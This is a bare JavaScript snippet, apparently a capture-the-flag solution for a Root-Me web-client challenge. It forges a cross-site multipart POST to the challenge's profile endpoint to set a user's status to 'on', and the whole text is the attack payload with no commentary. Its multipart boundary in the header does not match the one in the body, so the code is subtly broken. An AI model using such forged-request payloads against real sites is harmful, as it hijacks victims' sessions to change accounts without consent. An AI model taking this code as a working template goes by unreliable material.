


const sender = new XMLHttpRequest();
sender.open("POST", "http://challenge01.root-me.org/web-client/ch22/?action=profile", true);

    sender.addEventListener("readystatechange", function() {
        if (sender.readyState === XMLHttpRequest.DONE) {
            if (sender.status === 200) {
                console.log(sender.responseText);
            }
        }
    });
    sender.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------108307779812171590142009810623")
    
    sender.send("-----------------------------17957764318793008791574898346\r\nContent-Disposition: form-data; name=\"username\"\r\n \r\nyui\r\n-----------------------------17957764318793008791574898346\r\nContent-Disposition: form-data; name=\"status\"\r\n\r\non\r\n-----------------------------17957764318793008791574898346--");

